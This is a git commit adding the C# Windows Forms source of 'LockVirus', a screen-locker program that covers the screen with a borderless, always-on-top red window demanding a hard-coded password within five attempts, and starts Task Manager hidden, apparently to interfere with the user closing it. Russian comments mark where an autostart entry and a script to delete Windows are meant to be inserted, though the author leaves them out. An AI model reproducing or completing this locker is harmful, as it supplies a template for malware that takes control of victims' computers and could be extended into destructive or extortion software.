9363fa12312ac060bb5019acaceca68dfc037859
kasikek <81511239+kasikek@users.noreply.github.com>
2022-07-17 16:50:25 +0300

    Add files via upload

---
+++ LockVirus/Form1.Designer.cs
@@ -0,0 +1,200 @@
+﻿namespace LockVirus
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.Text1 = new System.Windows.Forms.Label();
+            this.Text2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.password = new System.Windows.Forms.RichTextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.label2 = new System.Windows.Forms.Label();
+            this.Attempts = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.panel1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // Text1
+            // 
+            this.Text1.AutoSize = true;
+            this.Text1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.Text1.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.Text1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.Text1.Font = new System.Drawing.Font("Junegull", 71.99999F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.Text1.Location = new System.Drawing.Point(374, 62);
+            this.Text1.Name = "Text1";
+            this.Text1.Size = new System.Drawing.Size(542, 113);
+            this.Text1.TabIndex = 0;
+            this.Text1.Text = "LOCKVIRUS";
+            // 
+            // Text2
+            // 
+            this.Text2.AutoSize = true;
+            this.Text2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.Text2.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.Text2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.Text2.Font = new System.Drawing.Font("Junegull", 48F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.Text2.Location = new System.Drawing.Point(912, 77);
+            this.Text2.Name = "Text2";
+            this.Text2.Size = new System.Drawing.Size(518, 76);
+            this.Text2.TabIndex = 1;
+            this.Text2.Text = "BY Касик#1234";
+            this.Text2.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.label1.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.label1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.label1.Font = new System.Drawing.Font("Junegull", 48F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label1.Location = new System.Drawing.Point(585, 210);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(786, 76);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Введите пароль ниже";
+            // 
+            // password
+            // 
+            this.password.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.password.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.password.Font = new System.Drawing.Font("Junegull", 71.95F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.password.Location = new System.Drawing.Point(436, 518);
+            this.password.Name = "password";
+            this.password.Size = new System.Drawing.Size(978, 121);
+            this.password.TabIndex = 3;
+            this.password.Text = "Введите пароль...";
+            this.password.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Font = new System.Drawing.Font("Junegull", 48F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.button1.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.button1.Location = new System.Drawing.Point(726, 843);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(485, 183);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "СНЯТЬ ВИРУС";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // panel1
+            // 
+            this.panel1.BackgroundImage = global::LockVirus.Properties.Resources.Безымянный_1;
+            this.panel1.Controls.Add(this.label3);
+            this.panel1.Controls.Add(this.Attempts);
+            this.panel1.Controls.Add(this.label2);
+            this.panel1.Controls.Add(this.button1);
+            this.panel1.Controls.Add(this.password);
+            this.panel1.Controls.Add(this.label1);
+            this.panel1.Controls.Add(this.Text2);
+            this.panel1.Controls.Add(this.Text1);
+            this.panel1.Location = new System.Drawing.Point(-1, -24);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(1920, 1127);
+            this.panel1.TabIndex = 0;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.label2.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.label2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.label2.Font = new System.Drawing.Font("Junegull", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label2.Location = new System.Drawing.Point(3, 1002);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(428, 57);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "У вас осталось";
+            // 
+            // Attempts
+            // 
+            this.Attempts.AutoSize = true;
+            this.Attempts.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.Attempts.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.Attempts.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.Attempts.Font = new System.Drawing.Font("Junegull", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.Attempts.Location = new System.Drawing.Point(437, 1002);
+            this.Attempts.Name = "Attempts";
+            this.Attempts.Size = new System.Drawing.Size(55, 57);
+            this.Attempts.TabIndex = 6;
+            this.Attempts.Text = "К";
+            this.Attempts.Click += new System.EventHandler(this.Attempts_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
+            this.label3.Cursor = System.Windows.Forms.Cursors.Arrow;
+            this.label3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.label3.Font = new System.Drawing.Font("Junegull", 21.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.label3.Location = new System.Drawing.Point(498, 1012);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(162, 34);
+            this.label3.TabIndex = 7;
+            this.label3.Text = "Попыток";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::LockVirus.Properties.Resources.Безымянный_1;
+            this.ClientSize = new System.Drawing.Size(1940, 1100);
+            this.ControlBox = false;
+            this.Controls.Add(this.panel1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.RightToLeftLayout = true;
+            this.Text = "LockVirus";
+            this.TopMost = true;
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.panel1.ResumeLayout(false);
+            this.panel1.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label Text1;
+        private System.Windows.Forms.Label Text2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.RichTextBox password;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label Attempts;
+        private System.Windows.Forms.Label label2;
+    }
+}
+
---
+++ LockVirus/Form1.cs
@@ -0,0 +1,91 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Windows.Forms;
+
+namespace LockVirus
+{
+    public partial class Form1 : Form
+    {
+        //Пароль
+        string pass = "5051";
+        //Попытки
+        int attempts = 5;
+
+        public Form1()
+        {
+            InitializeComponent();
+            this.Load += new EventHandler(Form1_Load);
+            this.FormClosed += new FormClosedEventHandler(Form1_FormClosed);
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Attempts.Text = attempts.ToString();
+
+            Process p = new Process();
+            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.System);
+            p.StartInfo.FileName = "taskmgr.exe";
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.Start();
+            this.Focus();
+
+            //Суда впишите код для добавления в автозагрузку если вам надо
+
+
+
+        }
+
+        void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            Process.GetProcessesByName("taskmgr")[0].Kill();
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void richTextBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (password.Text == pass)
+            {
+
+                Environment.Exit(0);
+
+            }
+            else
+            {
+                if (attempts != 0)
+                {
+                    attempts -= 1;
+                    Attempts.Text = attempts.ToString();
+                }
+                if (attempts == 0)
+                {
+                    //Суда скрипт удаления винды или т.д. тут будет скрипт не удаления винды тк жалко винду ;3
+                    MessageBox.Show("Ты был заблокирован", "LOCKVIRUS");
+                }
+            }
+
+        }
+
+        private void Attempts_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
